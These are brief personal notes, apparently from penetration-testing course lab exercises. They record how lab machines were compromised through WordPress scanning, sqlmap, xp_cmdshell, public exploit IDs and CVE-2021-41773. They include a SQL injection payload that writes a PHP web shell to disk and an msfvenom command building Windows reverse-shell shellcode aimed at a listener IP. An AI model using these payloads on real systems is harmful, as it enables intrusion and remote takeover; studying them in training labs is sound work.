### 10.3.2.4

added the ip to /etc/hosts
scanned the website using wpscan
exploited sqli using sqlmap
uploaded reverse shell using wordpress plugin
got user as www-root
flag.txt in /var/www

### 10.3.2.5

email subscribe field in home page
boolean based sqli in post request with item mail-list
write php shell to file using sql injection
mail-list=' UNION SELECT null, null, null, null,"<?php echo system($_GET['cmd']);?>", null  INTO OUTFILE "/var/www/html/web1.php" -- //
http://forestsave.lab/web1.php?cmd=cat%20../flag.txt


### 10.3.2.7
SQLi in login 
xp_cmdshell working
uploaded powershell reverse shell and got reverse connection

### 11.3.1.3

Follow the walkthrough

### 12.4.1.1

Mouseserver exploit
49601

### 12.4.1.2

CVE : CVE-2021-41773

### 12.4.1.3

all port scan using nmap 
james smtp server running use exploit 50347
change port numbers according to nmap

### 13.2.3.2

same as walkthrough of fixing web exploits
took reverse shell using bash one liner reverse shell passing in cmd param

### 13.2.3.3
directory brute force with common.txt and big.txt no results

used exploit 46481 and used any jpeg image

### 13.2.3.4

found port 20000
enumerated port further with nmap -A and nmap -sV
easy chat server running 
tried with application locally
only changed payload with stageless reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=1990 -f python -b "\x00\x20" -v shellcode
fire